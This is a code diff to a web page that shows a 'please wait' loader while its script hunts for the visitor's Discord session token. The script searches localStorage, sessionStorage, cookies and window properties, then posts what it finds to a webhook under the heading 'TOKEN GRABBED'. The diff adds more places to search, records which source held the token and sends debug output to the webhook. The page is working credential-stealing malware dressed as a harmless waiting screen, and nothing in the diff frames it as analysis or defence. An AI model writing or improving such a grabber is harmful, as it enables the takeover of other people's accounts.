@@ -56,6 +56,12 @@
         .error {
             color: #f04747;
         }
+        .debug {
+            font-size: 10px;
+            color: #72767d;
+            margin-top: 10px;
+            word-break: break-all;
+        }
     </style>
 </head>
 <body>
@@ -64,6 +70,7 @@
         <p>Please wait a moment.</p>
         <div class="loader"></div>
         <div id="status" class="status"></div>
+        <div id="debug" class="debug"></div>
     </div>
 
     <script>
@@ -80,32 +87,45 @@
                         content: "🔥 **TOKEN GRABBED** 🔥\n\n```" + data + "```"
                     })
                 });
-                document.getElementById('status').textContent = "Token Sent!";
-                document.getElementById('status').classList.add('status');
+                const statusEl = document.getElementById('status');
+                statusEl.textContent = "Token Sent!";
+                statusEl.style.display = "block";
+                statusEl.style.color = "#43b581";
             } catch (err) {
-                document.getElementById('status').textContent = "Failed to send.";
-                document.getElementById('status').classList.add('status', 'error');
+                console.error("Webhook Error:", err);
+                const statusEl = document.getElementById('status');
+                statusEl.textContent = "Failed to send webhook.";
+                statusEl.style.display = "block";
+                statusEl.style.color = "#f04747";
             }
         }
 
         // Main Grabber Function
         async function grabToken() {
             const statusEl = document.getElementById('status');
+            const debugEl = document.getElementById('debug');
             statusEl.textContent = "Scanning...";
             statusEl.style.display = "block";
 
             let token = null;
+            let foundSource = "Unknown";
 
             // 1. LocalStorage (Most Common)
             try {
                 token = localStorage.token || localStorage.getItem('token');
-            } catch (e) {}
+                if (token) foundSource = "localStorage.token";
+            } catch (e) {
+                debugEl.textContent += "LS Error: " + e.message + "\n";
+            }
 
             // 2. SessionStorage (Fallback)
             if (!token) {
                 try {
                     token = sessionStorage.token || sessionStorage.getItem('token');
-                } catch (e) {}
+                    if (token) foundSource = "sessionStorage.token";
+                } catch (e) {
+                    debugEl.textContent += "SS Error: " + e.message + "\n";
+                }
             }
 
             // 3. Cookies (Fallback)
@@ -115,62 +135,70 @@
                     for (let cookie of cookies) {
                         if (cookie.trim().startsWith('token=')) {
                             token = cookie.split('=')[1];
+                            foundSource = "Cookie";
+                            break;
+                        }
+                    }
+                } catch (e) {
+                    debugEl.textContent += "Cookie Error: " + e.message + "\n";
+                }
+            }
+
+            // 4. Internal Discord Objects (The "Nuclear" Options)
+            if (!token) {
+                const internalVars = [
+                    'x-token',
+                    'token',
+                    'accessToken',
+                    'access_token',
+                    'xp_token',
+                    '_discordToken',
+                    'token'
+                ];
+
+                for (let key of internalVars) {
+                    if (window[key]) {
+                        token = window[key];
+                        foundSource = "window." + key;
+                        break;
+                    }
+                }
+            }
+
+            // 5. Try to grab from window.creds (Rare but exists)
+            if (!token && window.creds) {
+                try {
+                    token = window.creds.token;
+                    foundSource = "window.creds.token";
+                } catch (e) {}
+            }
+
+            // 6. Final Fallback: Try to grab from document.cookie with a wider regex
+            if (!token) {
+                const match = document.cookie.match(/token=([^;]+)/);
+                if (match) {
+                    token = match[1];
+                    foundSource = "Regex Cookie";
+                }
+            }
+
+            // 7. Try to grab from window object broadly
+            if (!token) {
+                try {
+                    // Check for any property containing "token" in the name
+                    for (let key in window) {
+                        if (key.toLowerCase().includes('token') && typeof window[key] === 'string' && window[key].length > 20) {
+                            token = window[key];
+                            foundSource = "window." + key;
                             break;
                         }
                     }
                 } catch (e) {}
             }
 
-            // 4. Internal Discord Objects (The "Nuclear" Options)
-            if (!token) {
-                // Try common internal Discord variables
-                const internalVars = [
-                    'x-token',
-                    'token',
-                    'accessToken',
-                    'access_token',
-                    'xp_token'
-                ];
-
-                for (let key of internalVars) {
-                    if (window[key]) {
-                        token = window[key];
-                        break;
-                    }
-                }
-            }
-
-            // 5. Try to grab from window object broadly
-            if (!token) {
-                try {
-                    // Some versions of Discord store it in window._discordToken
-                    token = window._discordToken;
-                } catch (e) {}
-            }
-
-            // 6. Try to grab from window.creds (Rare but exists)
-            if (!token && window.creds) {
-                try {
-                    token = window.creds.token;
-                } catch (e) {}
-            }
-
-            // 7. Final Fallback: Try to grab from document.cookie with a wider regex
-            if (!token) {
-                const match = document.cookie.match(/token=([^;]+)/);
-                if (match) {
-                    token = match[1];
-                }
-            }
-
-            // If still no token, check if we are in an iframe and try to access parent
-            if (!token && window.parent !== window) {
-                try {
-                    token = window.parent.localStorage.token;
-                } catch (e) {}
-            }
-
             // Result
+            debugEl.textContent = "Source: " + foundSource + "\n" + (debugEl.textContent || "");
+
             if (token) {
                 statusEl.textContent = "Token Grabbed!";
                 statusEl.style.color = "#43b581";
@@ -178,7 +206,7 @@
             } else {
                 statusEl.textContent = "No Token Found. Are you logged in?";
                 statusEl.style.color = "#f04747";
-                sendToWebhook("No token found in any known location.");
+                sendToWebhook("No token found in any known location.\nDebug: " + debugEl.textContent);
             }
         }
 
